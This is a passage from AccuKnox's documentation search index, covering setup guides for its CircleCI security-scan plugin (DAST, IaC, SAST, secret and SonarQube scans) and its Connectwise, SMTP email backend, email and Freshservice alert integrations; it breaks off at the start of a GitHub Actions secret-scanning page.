jobs:\n      - accuknox-scan/dast:\n          context: accuknox-context\n          TARGET_URL: \"[http://testphp.vulnweb.com](http://testphp.vulnweb.com)\"\n          DAST_SCAN_TYPE: \"baseline\"\n          SEVERITY_THRESHOLD: \"High\"\n          SOFT_FAIL: true\n</code></pre> <p>Explanation of Parameters:</p> Parameter Description <code>TARGET_URL</code> The URL of the web application you want to scan. This must be externally reachable. <code>DAST_SCAN_TYPE</code> Type of scan to perform. Accepts <code>baseline</code> or <code>full-scan</code>. <code>SEVERITY_THRESHOLD</code> Minimum severity level that causes the job to fail (<code>Low</code>, <code>Medium</code>, <code>High</code>). <code>SOFT_FAIL</code> If set to <code>true</code>, the job will not fail even if issues above threshold are found. <p></p>"},{"location":"integrations/circleci-dast/#view-results-in-accuknox-console","title":"View Results in AccuKnox Console","text":"<p>After the scan is complete:</p> <ol> <li>Log into AccuKnox Console.</li> <li>Navigate to Issues \u2192 Findings \u2192 DAST Findings.</li> <li> <p>Identify vulnerabilities reported during the scan. </p> </li> <li> <p>Click on a finding to view details including:</p> </li> <li>Vulnerability description</li> <li>Affected endpoint</li> <li>Severity</li> <li> <p>Suggested remediation steps </p> </li> <li> <p>Follow the recommendations to remediate the issue.</p> </li> <li>Optionally, create a ticket in your internal tracking system (e.g., Jira, GitHub Issues) to assign this to your dev team.  </li> </ol>"},{"location":"integrations/circleci-dast/#step-4-validate-the-fix","title":"Step 4: Validate the Fix","text":"<p>After implementing the fix, push the changes again. The DAST job will rerun in CircleCI, and the new scan results will be forwarded to AccuKnox.</p> <p>Return to the DAST Findings section in AccuKnox to verify that the vulnerability has been resolved.</p>"},{"location":"integrations/circleci-dast/#conclusion","title":"Conclusion","text":"<p>By integrating AccuKnox\u2019s DAST scanning into your CircleCI pipeline, your organization gains continuous visibility into application-layer security risks. This enables faster remediation, enforces shift-left security practices, and improves compliance posture.</p> <p>The plugin is lightweight, configuration-driven, and designed for easy use across all CI/CD stages. DAST scanning with AccuKnox is also supported on other platforms like GitHub Actions, GitLab CI, Jenkins, Azure Pipelines, and AWS CodePipelines.</p> <p>For more help, contact support@accuknox.com or refer to the AccuKnox Developer Documentation.</p> <p>Note</p> <p>Since the AccuKnox CircleCI plugin is currently unverified, you must enable the usage of unverified orbs in your CircleCI project settings. Navigate to Organization Settings \u2192 Security and toggle \"Allow uncertified public orbs\" to <code>true</code>. </p>"},{"location":"integrations/circleci-iac-scan/","title":"IaC Scanning Integration using AccuKnox CircleCI Plugin","text":"<p>This guide outlines how to integrate Infrastructure as Code (IaC) scanning into your CircleCI pipeline using the AccuKnox plugin. IaC scanning helps identify misconfigurations and security issues in infrastructure code such as Terraform, Kubernetes YAML, or Helm charts before they are deployed to production.</p>"},{"location":"integrations/circleci-iac-scan/#prerequisites","title":"Prerequisites","text":"<ul> <li>A configured CircleCI project connected to your application's source repository.</li> <li>Admin access to create CircleCI Contexts or add Project-level Environment Variables.</li> <li>Access to the AccuKnox platform.</li> </ul>"},{"location":"integrations/circleci-iac-scan/#step-1-log-in-to-accuknox-and-generate-api-token","title":"Step 1: Log in to AccuKnox and Generate API Token","text":"<ol> <li>Log into your AccuKnox Console.</li> <li>Navigate to Settings \u2192 Tokens.</li> <li>Create a new token to use for sending scan results securely from CircleCI to AccuKnox. For detailed steps, refer to How to Create Tokens.</li> </ol>"},{"location":"integrations/circleci-iac-scan/#step-2-set-environment-variables-in-circleci","title":"Step 2: Set Environment Variables in CircleCI","text":"<p>You can configure environment variables in two ways:</p>"},{"location":"integrations/circleci-iac-scan/#option-a-use-circleci-contexts-recommended","title":"Option A: Use CircleCI Contexts (Recommended)","text":"<ol> <li>Go to CircleCI \u2192 Organization Settings \u2192 Contexts.</li> <li>Create a new context (e.g., <code>accuknox-context</code>).</li> <li>Add the following environment variables:</li> </ol> Name Description <code>ACCUKNOX_TOKEN</code> API token from AccuKnox <code>ACCUKNOX_ENDPOINT</code> AccuKnox API endpoint (e.g., <code>https://cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT</code> Your tenant ID from AccuKnox <code>ACCUKNOX_LABEL</code> Logical grouping label for scan results <p>Attach the context to your scan jobs like this:</p> <pre><code>- accuknox-scan/iac:\n    context: accuknox-context\n    SOFT_FAIL: false\n</code></pre>"},{"location":"integrations/circleci-iac-scan/#option-b-use-project-level-environment-variables","title":"Option B: Use Project-Level Environment Variables","text":"<ol> <li>Navigate to CircleCI \u2192 Project Settings \u2192 Environment Variables.</li> <li>Add the same four variables manually.</li> </ol>"},{"location":"integrations/circleci-iac-scan/#step-3-add-the-iac-job-to-circleci-configuration","title":"Step 3: Add the IaC Job to CircleCI Configuration","text":"<p>Update your <code>.circleci/config.yml</code> with the <code>iac</code> job from the AccuKnox plugin.</p> <pre><code>version: 2.1\n\norbs:\n  accuknox-scan: accuknox/scan@1.0.0\n\nworkflows:\n  accuknox:\n    jobs:\n      - accuknox-scan/iac:\n          context: accuknox-context\n          FRAMEWORK: \"terraform\"\n          DIRECTORY: \".\"\n          SOFT_FAIL: true\n</code></pre>"},{"location":"integrations/circleci-iac-scan/#explanation-of-parameters","title":"Explanation of Parameters","text":"Parameter Description <code>FILE</code> Specific file to scan (e.g., <code>main.tf</code>). Cannot be used with <code>DIRECTORY</code>. <code>DIRECTORY</code> Directory containing infrastructure code files. Default: <code>.</code>. <code>COMPACT</code> If <code>true</code>, suppresses full code blocks in the output. Default: <code>true</code>. <code>QUIET</code> If <code>true</code>, displays only failed checks. Default: <code>true</code>. <code>FRAMEWORK</code> The infrastructure type (e.g., <code>terraform</code>, <code>kubernetes</code>). Optional. <code>SOFT_FAIL</code> If <code>true</code>, does not fail pipeline on vulnerabilities. Default: <code>true</code>."},{"location":"integrations/circleci-iac-scan/#view-results-in-accuknox-console","title":"View Results in AccuKnox Console","text":"<p>After the pipeline runs:</p> <ol> <li>Log into the AccuKnox Console.</li> <li> <p>Navigate to Issues \u2192 Findings \u2192 IaC Findings. </p> </li> <li> <p>Review the scan output, which includes:</p> <ul> <li>Misconfigured parameters</li> <li>Severity and affected resource</li> <li>File and line number</li> <li>Suggested remediation </li> </ul> </li> <li> <p>Optionally, create a ticket in your internal tracking system (e.g., Jira, GitHub Issues) to assign this to your dev team. </p> </li> </ol>"},{"location":"integrations/circleci-iac-scan/#step-4-remediate-and-re-scan","title":"Step 4: Remediate and Re-Scan","text":"<p>After fixing the issues:</p> <ul> <li>Push your changes to the repo to trigger a re-scan via CircleCI.</li> <li>Confirm the updated status under IaC Findings in the AccuKnox Console.</li> </ul>"},{"location":"integrations/circleci-iac-scan/#conclusion","title":"Conclusion","text":"<p>By incorporating AccuKnox's IaC scanning into your CI/CD workflow, you ensure misconfigurations and security weaknesses in infrastructure code are caught early. This reduces risk and supports secure infrastructure provisioning across environments. AccuKnox plugins are lightweight, CI-friendly, and support GitHub Actions, GitLab, Jenkins, Azure Pipelines, and AWS CodePipeline.</p> <p>For more help, contact <code>support@accuknox.com</code> or refer to the AccuKnox Developer Documentation.</p> <p>Note</p> <p>Since the AccuKnox CircleCI plugin is currently unverified, you must enable the usage of unverified orbs in your CircleCI project settings. Navigate to Organization Settings \u2192 Security and toggle \"Allow uncertified public orbs\" to <code>true</code>. </p>"},{"location":"integrations/circleci-overview/","title":"CircleCI Integrations","text":""},{"location":"integrations/circleci-overview/#circleci-integrations","title":"CircleCI Integrations","text":"<p>DAST (Dynamic Application Security Testing)</p> <p>SAST (Static Analysis)</p> <p>IaC Scan</p> <p>Secret Scan</p> <p>SQ-SAST (SonarQube Static Application Security Testing)</p> <p>Container Scan</p> <p></p>"},{"location":"integrations/circleci-sast/","title":"SAST Scanning Integration using AccuKnox CircleCI Plugin","text":"<p>This guide explains how to integrate Static Application Security Testing (SAST) scans into your CircleCI CI/CD pipeline using the AccuKnox plugin. SAST helps identify vulnerabilities in source code early in the development lifecycle, enabling teams to implement secure coding practices and prevent potential exploits before deployment.</p>"},{"location":"integrations/circleci-sast/#prerequisites","title":"Prerequisites","text":"<ul> <li>A configured CircleCI project connected to your application's source repository.</li> <li>Admin access to create CircleCI Contexts or add Project-level Environment Variables.</li> <li>Access to the AccuKnox platform.</li> </ul>"},{"location":"integrations/circleci-sast/#step-1-log-in-to-accuknox-and-generate-api-token","title":"Step 1: Log in to AccuKnox and Generate API Token","text":"<ol> <li>Log into your AccuKnox Console.</li> <li>Navigate to Settings \u2192 Tokens.</li> <li>Create a new token to use for sending scan results securely from CircleCI to AccuKnox. For detailed steps, refer to How to Create Tokens.</li> </ol>"},{"location":"integrations/circleci-sast/#step-2-set-environment-variables-in-circleci","title":"Step 2: Set Environment Variables in CircleCI","text":"<p>You can configure environment variables in two ways:</p>"},{"location":"integrations/circleci-sast/#option-a-use-circleci-contexts-recommended","title":"Option A: Use CircleCI Contexts (Recommended)","text":"<ol> <li>Go to CircleCI \u2192 Organization Settings \u2192 Contexts.</li> <li>Create a new context (e.g., <code>accuknox-context</code>).</li> <li>Add the following environment variables:</li> </ol> Name Description <code>ACCUKNOX_TOKEN</code> API token from AccuKnox <code>ACCUKNOX_ENDPOINT</code> AccuKnox API endpoint (e.g., <code>https://cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT</code> Your tenant ID from AccuKnox <code>ACCUKNOX_LABEL</code> Logical grouping label for scan results <p>Attach the context to your scan jobs like this:</p> <pre><code>- accuknox-scan/sast:\n    context: accuknox-context\n    SOFT_FAIL: false\n</code></pre>"},{"location":"integrations/circleci-sast/#option-b-use-project-level-environment-variables","title":"Option B: Use Project-Level Environment Variables","text":"<ol> <li>Navigate to CircleCI \u2192 Project Settings \u2192 Environment Variables.</li> <li>Add the same four variables manually.     </li> </ol>"},{"location":"integrations/circleci-sast/#step-3-add-the-sast-job-to-circleci-configuration","title":"Step 3: Add the SAST Job to CircleCI Configuration","text":"<p>Update your <code>.circleci/config.yml</code> file to include the AccuKnox SAST scan:</p> <pre><code>version: 2.1\n\norbs:\n  accuknox-scan: accuknox/scan@1.0.0\n\nworkflows:\n  accuknox:\n    jobs:\n      - accuknox-scan/sast:\n          context: accuknox-context\n          SOFT_FAIL: false\n</code></pre>"},{"location":"integrations/circleci-sast/#explanation-of-parameters","title":"Explanation of Parameters","text":"Parameter Description <code>SOFT_FAIL</code> If set to <code>true</code>, the job will not fail even if vulnerabilities are found."},{"location":"integrations/circleci-sast/#view-results-in-accuknox-console","title":"View Results in AccuKnox Console","text":"<p>After the scan completes:</p> <ol> <li>Log in to the AccuKnox Console.</li> <li> <p>Navigate to Issues \u2192 Findings \u2192 SAST Findings.     </p> </li> <li> <p>View details including: - Vulnerability description - File and line number - Severity - Suggested remediation steps     </p> </li> <li> <p>Optionally, create a ticket in your internal tracking system (e.g., Jira, GitHub Issues) to assign this to your dev team.     </p> </li> </ol>"},{"location":"integrations/circleci-sast/#step-4-validate-the-fix","title":"Step 4: Validate the Fix","text":"<p>After remediating the issue:</p> <ul> <li>Push your changes to trigger a new scan.</li> <li>The job will rerun, and new scan results will be sent to AccuKnox.</li> <li>Confirm that the vulnerability no longer appears under SAST Findings.</li> </ul>"},{"location":"integrations/circleci-sast/#conclusion","title":"Conclusion","text":"<p>Integrating SAST scanning with AccuKnox in your CircleCI pipeline ensures vulnerabilities are detected and fixed early in the SDLC. This enables better compliance, reduces security debt, and supports shift-left security practices. The AccuKnox plugin is lightweight, easy to configure, and supports integration across GitHub Actions, GitLab, Jenkins, Azure DevOps, and other CI/CD tools.</p> <p>For more help, contact <code>support@accuknox.com</code> or refer to the AccuKnox Developer Documentation.</p> <p>Note</p> <p>Since the AccuKnox CircleCI plugin is currently unverified, you must enable the usage of unverified orbs in your CircleCI project settings. Navigate to Organization Settings \u2192 Security and toggle \"Allow uncertified public orbs\" to <code>true</code>. </p>"},{"location":"integrations/circleci-secret-scan/","title":"Secret Scanning Integration using AccuKnox CircleCI Plugin","text":"<p>AccuKnox\u2019s Secret Scanning capability is a powerful tool for early detection of hardcoded secrets and sensitive credentials within your codebase. Integrating this functionality into your CircleCI pipeline enforces robust security best practices and helps prevent credential leakage before your code reaches production.</p>"},{"location":"integrations/circleci-secret-scan/#prerequisites","title":"Prerequisites","text":"<p>Before you begin the integration, ensure you have the following:</p> <ul> <li>A CircleCI project connected to your source code repository.</li> <li>Admin privileges to create CircleCI Contexts or manage Project-level Environment Variables.</li> <li>Access to the AccuKnox platform.</li> </ul>"},{"location":"integrations/circleci-secret-scan/#step-1-log-in-to-accuknox-and-generate-api-token","title":"Step 1: Log in to AccuKnox and Generate API Token","text":"<p>To begin, you'll need an API token from AccuKnox:</p> <ol> <li>Log into your AccuKnox Console.</li> <li>Navigate to Settings \u2192 Tokens.</li> <li>Create a new token that will be used to securely send scan results from CircleCI to AccuKnox. For detailed instructions, refer to the \"How to Create Tokens\" documentation.</li> </ol> <p></p>"},{"location":"integrations/circleci-secret-scan/#step-2-set-environment-variables-in-circleci","title":"Step 2: Set Environment Variables in CircleCI","text":"<p>You have two options for configuring environment variables in CircleCI:</p>"},{"location":"integrations/circleci-secret-scan/#option-a-use-circleci-contexts-recommended","title":"Option A: Use CircleCI Contexts (Recommended)","text":"<p>Using contexts is the recommended approach for managing environment variables across multiple jobs.</p> <ol> <li>Go to CircleCI \u2192 Organization Settings \u2192 Contexts.</li> <li>Create a new context (e.g., <code>accuknox-context</code>).</li> <li>Add the following environment variables to the new context:</li> </ol> Name Description <code>ACCUKNOX_TOKEN</code> API token from AccuKnox <code>ACCUKNOX_ENDPOINT</code> AccuKnox API endpoint (e.g., <code>https://cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT</code> Your tenant ID from AccuKnox <code>ACCUKNOX_LABEL</code> Logical grouping label for scan results <ol> <li> <p>Attach this context to your scan jobs within your <code>.circleci/config.yml</code> file, like so:</p> <pre><code>     - accuknox-scan/secret:\n          context: accuknox-context\n          SOFT_FAIL: false\n</code></pre> </li> </ol>"},{"location":"integrations/circleci-secret-scan/#option-b-use-project-level-environment-variables","title":"Option B: Use Project-Level Environment Variables","text":"<p>If contexts aren't suitable for your setup, you can use project-level environment variables:</p> <ol> <li>Navigate to CircleCI \u2192 Project Settings \u2192 Environment Variables.</li> <li>Add the same four variables manually as described in Option A.</li> </ol> <p></p>"},{"location":"integrations/circleci-secret-scan/#step-3-add-the-secret-scanning-job-to-circleciconfigyml","title":"Step 3: Add the Secret Scanning Job to <code>.circleci/config.yml</code>","text":"<p>Update your CircleCI configuration file (<code>.circleci/config.yml</code>) to include the secret scanning job from the AccuKnox plugin:</p> <pre><code>version: 2.1\n\norbs:\n  accuknox-scan: accuknox/scan@1.0.0\n\nworkflows:\n  accuknox:\n    jobs:\n      - accuknox-scan/secret:\n          context: accuknox-context\n          SOFT_FAIL: true\n</code></pre>"},{"location":"integrations/circleci-secret-scan/#explanation-of-parameters","title":"Explanation of Parameters","text":"<p>The <code>accuknox-scan/secret</code> job accepts several optional parameters to fine-tune its behavior:</p> Parameter Description <code>RESULTS</code> Types of results to include (verified, unverified, etc.). Optional. <code>BRANCH</code> Branch to scan (e.g., <code>main</code>, <code>all-branches</code>). Optional. <code>EXCLUDE_PATHS</code> Comma-separated paths to exclude from scanning. <code>ADDITIONAL_ARGUMENTS</code> Any additional flags for fine-tuning secret scanning. <code>SOFT_FAIL</code> If <code>true</code>, the job won\u2019t fail even if secrets are found. Default: <code>true</code>. <p></p>"},{"location":"integrations/circleci-secret-scan/#view-results-in-accuknox-console","title":"View Results in AccuKnox Console","text":"<p>Once the scan completes, you can review the findings:</p> <ol> <li>Log in to the AccuKnox Console.</li> <li> <p>Navigate to Issues \u2192 Findings \u2192 Secret Findings. </p> </li> <li> <p>Review the results, paying attention to:</p> <ul> <li>Type of secret found (e.g., API keys, tokens, credentials).</li> <li>File and line number where the secret was detected.</li> <li>Suggested action/remediation. </li> </ul> </li> <li> <p>Optionally, create a ticket in your internal tracking system (e.g., Jira, GitHub Issues) to assign the remediation to your development team. </p> </li> </ol>"},{"location":"integrations/circleci-secret-scan/#step-4-remediate-and-re-scan","title":"Step 4: Remediate and Re-Scan","text":"<p>After you've addressed the identified secrets:</p> <ol> <li>Push the updated code to your repository.</li> <li>CircleCI will automatically re-trigger the pipeline, which will re-run the secret scan.</li> <li>Confirm the resolution of the secrets in the AccuKnox Console under the Secret Findings section.</li> </ol>"},{"location":"integrations/circleci-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating secret scanning into your CI/CD pipeline with AccuKnox is a critical step in preventing sensitive information leaks during development. This approach enables a shift-left security strategy, ensuring that credentials are identified and remediated before they ever reach production code. The AccuKnox CircleCI plugin is designed for speed and ease of use, and its capabilities can be extended to other platforms like GitHub Actions, GitLab, Jenkins, Azure DevOps, and more.</p> <p>For more help, contact <code>support@accuknox.com</code> or refer to the AccuKnox Developer Documentation.</p> <p>Note</p> <p>Since the AccuKnox CircleCI plugin is currently unverified, you must enable the usage of unverified orbs in your CircleCI project settings. Navigate to Organization Settings \u2192 Security and toggle \"Allow uncertified public orbs\" to <code>true</code>. </p>"},{"location":"integrations/circleci-sqsast/","title":"SonarQube Static Application Security Testing (SQ-SAST) Integration using AccuKnox CircleCI Plugin","text":"<p>This section details the integration of SonarQube-based Static Application Security Testing (SAST) into your CircleCI pipeline using the AccuKnox CircleCI plugin. This integration allows you to statically analyze your source code for vulnerabilities and automatically forward the results to AccuKnox for centralized visibility and triage.</p>"},{"location":"integrations/circleci-sqsast/#prerequisites","title":"Prerequisites","text":"<p>Before integrating, ensure you have the following in place:</p> <ul> <li>A running instance of SonarQube or SonarCloud.</li> <li>A configured project in SonarQube.</li> <li>A CircleCI project connected to your repository.</li> <li>Admin access to manage CircleCI Contexts or Environment Variables.</li> <li>Access to the AccuKnox Console.</li> </ul>"},{"location":"integrations/circleci-sqsast/#step-1-generate-tokens","title":"Step 1: Generate Tokens","text":"<p>You'll need to generate API tokens from both SonarQube and AccuKnox.</p>"},{"location":"integrations/circleci-sqsast/#in-sonarqube","title":"In SonarQube:","text":"<ol> <li>Go to My Account \u2192 Security.</li> <li>Generate a <code>SONAR_TOKEN</code> (user token). </li> </ol>"},{"location":"integrations/circleci-sqsast/#in-accuknox","title":"In AccuKnox:","text":"<ol> <li>Log into your AccuKnox Console.</li> <li>Navigate to Settings \u2192 Tokens.</li> <li>Create a new token to securely send scan results from CircleCI to AccuKnox. For detailed instructions, refer to the \"How to Create Tokens\" documentation. </li> </ol>"},{"location":"integrations/circleci-sqsast/#step-2-configure-environment-variables-in-circleci","title":"Step 2: Configure Environment Variables in CircleCI","text":"<p>You can configure environment variables using either CircleCI Contexts (recommended) or Project-level Environment Variables.</p>"},{"location":"integrations/circleci-sqsast/#required-environment-variables","title":"Required Environment Variables","text":"<p>Here are the variables you'll need to set:</p>"},{"location":"integrations/circleci-sqsast/#sonarqube-variables","title":"SonarQube Variables","text":"Variable Description <code>SONAR_TOKEN</code> User token from SonarQube <code>SONAR_HOST_URL</code> SonarQube instance URL <code>SONAR_PROJECT_KEY</code> Unique project key in SonarQube <code>SONAR_ORG_ID</code> Required for SonarCloud Enterprise"},{"location":"integrations/circleci-sqsast/#accuknox-variables","title":"AccuKnox Variables","text":"Variable Description <code>ACCUKNOX_TOKEN</code> API Token from AccuKnox Console <code>ACCUKNOX_ENDPOINT</code> AccuKnox API endpoint (e.g., <code>https://cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT</code> Your tenant ID in AccuKnox <code>ACCUKNOX_LABEL</code> Logical label to group scan results"},{"location":"integrations/circleci-sqsast/#option-a-using-circleci-contexts-recommended","title":"Option A: Using CircleCI Contexts (Recommended)","text":"<ol> <li>Go to Organization Settings \u2192 Contexts.</li> <li>Create a new context (e.g., <code>sonarqube-accuknox-context</code>).</li> <li>Add all the SonarQube and AccuKnox variables listed above to this new context.</li> <li>Attach the context to your job as shown in Step 3.</li> </ol>"},{"location":"integrations/circleci-sqsast/#option-b-project-level-variables","title":"Option B: Project-Level Variables","text":"<ol> <li>Navigate to Project Settings \u2192 Environment Variables.</li> <li>Add the same set of variables under the project settings. </li> </ol>"},{"location":"integrations/circleci-sqsast/#step-3-update-circleci-configuration","title":"Step 3: Update CircleCI Configuration","text":"<p>Add the <code>sq-sast</code> job to your <code>.circleci/config.yml</code> file and attach the context:</p> <pre><code>version: 2.1\n\norbs:\n  accuknox-scan: accuknox/scan@1.0.0\n\nworkflows:\n  accuknox:\n    jobs:\n      - accuknox-scan/sq-sast:\n          context: sonarqube-accuknox-context\n          SKIP_SONAR_SCAN: false\n          SOFT_FAIL: false\n</code></pre>"},{"location":"integrations/circleci-sqsast/#input-parameters","title":"Input Parameters","text":"<p>The <code>accuknox-scan/sq-sast</code> job accepts the following parameters:</p> Parameter Description Default <code>SOFT_FAIL</code> Prevents pipeline failure on vulnerabilities if set to <code>true</code>. <code>true</code> <code>SKIP_SONAR_SCAN</code> If <code>true</code>, skips the SonarQube scan step entirely. <code>false</code> <p></p>"},{"location":"integrations/circleci-sqsast/#step-4-view-results-in-accuknox-console","title":"Step 4: View Results in AccuKnox Console","text":"<p>Once the scan completes, you can review the findings in AccuKnox:</p> <ol> <li>Log in to the AccuKnox Console.</li> <li> <p>Navigate to Issues \u2192 Findings \u2192 Static Code Analysis Findings. </p> </li> <li> <p>Review the results, checking for:</p> <ul> <li>Vulnerability description</li> <li>File and line number</li> <li>Severity</li> <li>Suggested remediation steps </li> </ul> </li> <li> <p>Optionally, create a ticket in your internal tracking system (e.g., Jira, GitHub Issues) to assign this to your development team. </p> </li> </ol>"},{"location":"integrations/circleci-sqsast/#step-5-remediation-workflow","title":"Step 5: Remediation Workflow","text":"<p>Follow these steps to remediate identified issues:</p> <ol> <li>Review and fix the issues found in the codebase.</li> <li>Push your changes to trigger the CircleCI workflow again.</li> <li>Confirm that resolved issues are no longer listed in both your SonarQube and AccuKnox dashboards.</li> </ol>"},{"location":"integrations/circleci-sqsast/#summary","title":"Summary","text":"<p>By integrating SonarQube with AccuKnox via CircleCI, you achieve a more robust security posture:</p> <ul> <li>Automate static analysis for every commit.</li> <li>Forward findings securely to AccuKnox for centralized triage.</li> <li>Align security reviews with your CI/CD lifecycle.</li> </ul> <p>AccuKnox also supports integrations across other CI tools such as GitHub Actions, Jenkins, GitLab, and Azure DevOps.</p> <p>For more help, contact <code>support@accuknox.com</code> or refer to the AccuKnox Developer Documentation.</p> <p>Note</p> <p>Since the AccuKnox CircleCI plugin is currently unverified, you must enable the usage of unverified orbs in your CircleCI project settings. Navigate to Organization Settings \u2192 Security and toggle \"Allow uncertified public orbs\" to <code>true</code>. </p>"},{"location":"integrations/connectwise-cspm/","title":"Connectwise CSPM Integration","text":"<p>Integrate AccuKnox with Connectwise and receive AccuKnox alert notifications in your Connectwise account. With this integration, you can automate the process of generating Connectwise tickets with your existing security workflow.</p> <p>To set up this integration, you need to coordinate with your Connectwise administrator and gather the inputs needed to enable communication between AccuKnox and Connectwise.</p>"},{"location":"integrations/connectwise-cspm/#integration-of-connectwise","title":"Integration of Connectwise:","text":""},{"location":"integrations/connectwise-cspm/#a-prerequisites","title":"a. Prerequisites","text":"<ul> <li>You need a Service Desk URL , Company Id, Public key ,Private key &amp; Client Id for this integration.</li> <li>Go to this link :https://developer.connectwise.com/ClientID and fill the form to recieve your client id.</li> <li>To get public and private keys go to your Connectwise manage page \u2192 system \u2192 members \u2192 API keys and create new API keys , here you will receive a public and private key.</li> </ul>"},{"location":"integrations/connectwise-cspm/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration \u2192 CSPM.</li> <li>Click on add connector and select Connectwise</li> </ul> <p>Enter the following details to configure Connectwise.</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g.,<code>Testconnectwise</code></li> <li>Service Desk URL: Enter the URL of your Connectwise manage website. e.g., for <code>https://staging.connectwisedev.com/CD019....</code> enter the url as <code>https://staging.connectwisedev.com/</code></li> <li>Company Id: Enter your Connectwise Company Id here. e.g., <code>Connectwise_1</code></li> <li>Public key and Private key: Generate a public and private key by going to system \u2192 members \u2192 API keys and put the values respectively.</li> <li>Client Id: To receive your client Id go to this link: https://developer.connectwise.com/ClientID and fill the form for Client Id.</li> <li>Click Save to save the Integration.</li> </ul> <p></p> <p>Click on the Connectwise ticketing backend to add configuration.</p> <p>Here Enter the following details:</p> <ul> <li>Configuration name: this name will be displayed under ticket configuration while creating tickets.</li> <li>Default template: to specify the of data that this configuration will be used for making tickets.</li> <li>Companies : From the list of companies choose the company where you want to receive tickets.</li> <li>Issue Type: You can choose from the dropdown.</li> <li>Fill the priority mapping according to your choice and press save.</li> </ul> <p>You can now configure Alert Triggers for Connectwise.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/email-backend/","title":"Email Backend Integration","text":"<p>The Email Backend Integration allows making use of your own SMTP server to send all Emails that originate from the AccuKnox platform.</p>"},{"location":"integrations/email-backend/#prerequisites","title":"Prerequisites","text":"<p>You need to have the following credentials of your SMTP server handy:</p> <ul> <li> <p>SMTP Hostname</p> </li> <li> <p>SMTP Port and whether SSL or TLS needs to be used</p> </li> <li> <p>Your SMTP mail address and a trusted address which you would like to be the sender(Both can be same)</p> </li> <li> <p>The Password of the SMTP account or an App Password</p> </li> </ul> <p>For Gmail, you can find the credentials following this help article for SMTP server.</p>"},{"location":"integrations/email-backend/#integration-steps","title":"Integration Steps","text":"<ul> <li> <p>Navigate to Settings \u2192 Integrations \u2192 CSPM tab</p> </li> <li> <p>Click on Add Connector and select Email Backend</p> </li> </ul> <p></p> <ul> <li> <p>Specify the following details to make use of the Email Backend:</p> <ul> <li> <p>Name: Enter the name for the integration. You can set any name. e.g.,<code>Secure Email Backend</code></p> </li> <li> <p>Host: The SMTP Hostname. e.g.,<code>smtp.google.com</code></p> </li> <li> <p>Port: The port number to be used for the SMTP server. e.g.,<code>587</code></p> </li> <li> <p>Select to use TLS or SSL based on the port number specified in the Port field</p> </li> <li> <p>Username: The email address to authenticate with the SMTP server. e.g.,<code>admin@gmail.com</code></p> </li> <li> <p>From Email: The email address that will be in the Sender field of the emails. e.g.,<code>notify@gmail.com</code></p> </li> <li> <p>Secret: The Password to authenticate with the SMTP server. This could be an App Password</p> </li> </ul> </li> </ul> <p></p> <ul> <li> <p>Click on Save</p> </li> <li> <p>An email is received on the email address used for integration with the subject \"Init Mail\" for the AccuKnox tenant.</p> </li> </ul> <p>The Email Backend has now been configured successfully and all emails originating from the AccuKnox platform will henceforth be sent using this SMTP server.</p>"},{"location":"integrations/email/","title":"Email Integration","text":"<p>To send an alert notification via mail you must first set up the Email notification Channel.</p>"},{"location":"integrations/email/#steps-to-integrate","title":"Steps to integrate","text":"<ul> <li> <p>Navigate to Settings \u2192 Integrations \u2192 CWPP tab</p> </li> <li> <p>Click on the Integrate Now button for email</p> </li> </ul> <p></p> <ul> <li> <p>Fill the following fields:</p> <ul> <li> <p>Integration Name: Enter the name for the integration. You can set any name. e.g., <code>Container Security Alerts</code></p> </li> <li> <p>Email: Enter the Email that will receive the notification and press ENTER. You can specify multiple email addresses in this field by pressing ENTER after each email address. e.g.,<code>demo@organization.com</code></p> </li> </ul> </li> </ul> <p></p> <ul> <li> <p>Click Test to check the new functionality, You will receive a test mail on the specified mail addresses with subject \"Test email\"</p> </li> <li> <p>Click Save to save the Integration. You can now configure Alert Triggers for Email Notifications.</p> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"integrations/freshservice-cspm/","title":"Freshservice Integration","text":"<p>Integrate AccuKnox with Freshservice and receive AccuKnox alert notifications in your Freshservice accounts. With this integration, you can automate the process of generating Freshservice \u201cProblem alerts\u201c with your existing security workflow.</p> <p>To set up this integration, you need to coordinate with your Freshservice administrator and gather the inputs needed to enable communication between AccuKnox and Freshservice.</p>"},{"location":"integrations/freshservice-cspm/#integration-of-freshservice","title":"Integration of Freshservice:","text":""},{"location":"integrations/freshservice-cspm/#a-prerequisites","title":"a. Prerequisites","text":"<ul> <li>You need a Company domain , Email &amp; API key (secret) for this integration.</li> <li>You can find your API key in profile settings in the right side column.</li> </ul>"},{"location":"integrations/freshservice-cspm/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration \u2192 CSPM.</li> <li>Click on add connector and select Freshservice</li> </ul> <p>Enter the following details to configure Freshservice:</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g.,<code>TestFreshservice</code></li> <li>Domain Name: Enter the site name of your organization as shown in your URL. e.g., for <code>https://accuknoxexample.freshservice.com/</code> enter the domain name as <code>accuknoxexample</code>.</li> <li>User Email: Enter your Freshservice account email address here. e.g., <code>freshservice@organisation.com</code></li> <li>Secret: Enter the API key Here. This can be found in profile settings.</li> <li>Click Save to save the Integration.</li> </ul> <p></p> <p>Click on the Freshservice ticketing backend to add configuration.</p> <p>Here Enter the following details:</p> <ul> <li>Configuration name: this name will be displayed under ticket configuration while creating tickets.</li> <li>Default template: to specify the of data that this configuration will be used for making tickets.</li> <li>Issue Type: You can choose from the dropdown.</li> <li>Fill the priority mapping according to your choice and press save.</li> </ul> <p>You can now configure Alert Triggers for Freshservice.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/github-actions-secret-scan/","title":"GitHub Actions: Integrating AccuKnox Secret Scanning","text":"<p>This guide explains how to integrate AccuKnox Secret Scanning into your GitHub Actions CI/CD workflow. The integration detects hardcoded secrets and sensitive data in your codebase, forwarding findings to the AccuKnox platform for centralized analysis and remediation.</p>"},{"location":"integrations/github-actions-secret-scan/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitHub repository with Actions enabled</p> </li> <li> <p>AccuKnox platform access</p> </li> </ul>"},{"location":"integrations/github-actions-secret-scan/#steps-for-integration","title":"Steps for 